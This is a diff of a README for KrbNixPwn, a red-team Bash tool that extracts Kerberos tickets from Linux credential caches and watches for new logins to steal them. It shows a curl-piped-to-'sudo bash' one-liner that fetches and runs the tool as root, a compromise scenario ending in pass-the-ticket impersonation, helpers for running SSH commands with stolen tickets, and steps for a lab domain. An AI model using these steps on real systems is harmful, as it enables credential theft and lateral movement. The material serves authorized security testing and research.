@@ -10,14 +10,17 @@
     
 **Monitor and automatically dump Kerberos tickets from new user sessions (requires root privileges):**
 
-    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/main/KrbNixPwn.sh| sudo bash -s -- monitor
+    curl -sSL https://raw.githubusercontent.com/onSec-fr/KrbNixPwn/refs/heads/main/KrbNixPwn.sh | sudo bash -s -- monitor
 ------------
 
 - [Motivation](#motivation)
+- [Usage](#usage)
+  * [Example](#example)
+  * [Utils](#utils)
 - [Technical Background](#technical-background)
   * [Abstract](#abstract)
   * [Active Directory Integration](#active-directory-integration)
-  * [FreeIPA/IDM Integration](#freeipa-idm-integration)
+  * [FreeIPA/IDM Integration](#freeipaidm-integration)
   * [Hybrid (Trust-Based) Integration](#hybrid-trust-based-integration)
   * [Caching Mechanisms](#caching-mechanisms)
     + [FILE Cache](#file-cache)
@@ -25,7 +28,8 @@
     + [KCM (Kerberos Cache Manager)](#kcm-kerberos-cache-manager)
     + [KEYRING Cache](#keyring-cache)
   * [Security Implications](#security-implications)
-  * [References](#references)
+- [Playground: Integrating Linux machine into GOAD](#playground-integrating-linux-machine-into-goad-active-directory)
+- [References](#references)
 
 ### Motivation
 Linux systems are increasingly required to participate in enterprise identity management infrastructures alongside Windows environments, **making Kerberos-based authentication ubiquitous in hybrid environments**. However, while Windows red-team tooling (e.g., Rubeus) is mature, Linux Kerberos tooling remains fragmented :
@@ -37,6 +41,42 @@ Linux systems are increasingly required to participate in enterprise identity ma
 - **Unified toolchain** supporting all major cache backends.
 - **Zero-to-minimal dependencies** through pure Bash + coreutils.
 - **Monitoring mode** for long-term persistence and automatic extraction of new Kerberos sessions (like [Rubeus monitor](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#monitor "Rubeus monitor")).
+
+### Usage
+#### Disclaimer
+KrbNixPwn is provided strictly for **educational**, **research**, and **authorized security testing** purposes.
+Unauthorized use of this tool against systems you do not own or do not have explicit permission to test is illegal.
+
+> KrbNixPwn provides two operational modes — **dump** and **monitor**.
+
+Basic Command Structure : 
+
+    ./krbnixpwn.sh [dump|monitor] [-o output_dir] [--verbose] [--help]
+
+- **dump** Perform a full sweep of the system for Kerberos caches (FILE, DIR, KCM, KEYRING) and extract all identifiable credentials and keytabs.
+- **monitor** Watch for new user logins in real time and attempt extraction when new Kerberos sessions appear.
+- **-o or --output** Specify a custom directory to store extracted .ccache or .keytab artefacts. Default: */tmp/krbnixpwn.*
+- **-v or --verbose** Enable verbose debugging output.
+
+#### Example
+> Scenario: we have compromised the machine sl001@sevenkingdoms.local. 
+
+1. We launch KrbNixPwn in “monitor” mode and wait patiently for someone to log in. As soon as the victim logs in, their ticket is automatically extracted.
+![](res/demo_dump.gif)
+
+2. We can perform a pass-the-ticket attack from attacker machine to impersonate the user in Active Directory.
+![](res/demo_pth.gif)
+
+#### Utils
+The [utils](https://github.com/onSec-fr/KrbNixPwn/tree/master/utils "utils") directory contains additional scripts designed to facilitate the analysis and practical use of Kerberos credentials extracted by KrbNixPwn.  
+> **describe_tickets.sh** summarizes Kerberos credential caches (.ccache files) in a directory in a human-readable table, including principal, service principal, validity period, and renewal information. **Tickets that are still valid (expiration > current time) are highlighted in green for quick identification.**
+
+Usage : `./utils/describe_tickets.sh /path/to/ccache_dir`
+![](res/util_1.png)
+
+> **ssh_kerberos_exec.sh** executes SSH commands on multiple hosts using Kerberos authentication (GSSAPI) without relying on passwords. Ideal for post-extraction testing where a valid ticket is available.  
+
+Usage : `./utils/ssh_kerberos_exec.sh -f <hostfile> -u <user@domain.com> -c "<command>"`
 
 ### Technical Background
 #### Abstract
@@ -65,7 +105,7 @@ It is possible to integrate Linux clients in environments with both AD and FreeI
 - **AD ↔ FreeIPA trust:** Allows users from one domain to authenticate in another domain.
 - Linux machines can authenticate against AD users via SSSD using the IPA/IDM trust as a bridge.
 
-This setup requires correct Kerberos realm configuration, cross-realm trust, and proper mapping of POSIX attributes.
+> This setup requires correct Kerberos realm configuration, cross-realm trust, and proper mapping of POSIX attributes.
 
 #### Caching Mechanisms
 **Here is what interests us most from a red team perspective** - Both AD and IPA rely on the standard MIT Kerberos implementation on Linux, which exposes different cache formats depending on configuration :
@@ -101,7 +141,7 @@ The KEYRING cache type stores Kerberos tickets securely in the Linux kernel keyr
 With root access, **Kerberos tickets cached by any user can be extracted**. Unlike on Windows, this does not require performing noisy or intrusive actions that would typically trigger EDR detection. In FILE or DIR cache modes, retrieving the ccache files is straightforward. In KCM or KEYRING modes, extraction remains entirely feasible using the appropriate techniques.  
 **KrbNixPwn automates all of these workflows, handling each cache backend transparently and without operator intervention.**
 
-** Cross-platform attacks : Linux ↔ Windows**
+**Cross-platform attacks : Linux ↔ Windows**
 Kerberos on Linux (MIT Kerberos) uses ccache files, while Windows uses kcache / kirbi formats.  
 Despite this difference, the actual Kerberos ticket data (encrypted TGT/TGS blobs) are compatible.
 
@@ -132,6 +172,8 @@ A Linux-dumped ticket can be:
 > This shows realm info, KDC, and configuration details.
 
 5. Join the machine in the AD domain (requires AD user with machine join privileges) : `sudo realm join --user=Administrator SEVENKINGDOMS.LOCAL`
+
+![](res/lab_1.png)
 
 6. Verify the integration
 - List the joined realm: `realm list`
@@ -180,6 +222,8 @@ You can now login with `ssh stannis.baratheon@sevenkingdoms.local@<linux_machine
 - Enter the user password from AD (*Drag0nst0ne*).
 - Successful login confirms both Kerberos and SSSD integration.
 - Confirm with a `klist`
+
+![](res/lab_2.png)
 
 11. Play with configuration
 **Once your Debian machine is integrated into the domain, you can customize authentication behavior and ticket caching, as well as restrict login and sudo access.**
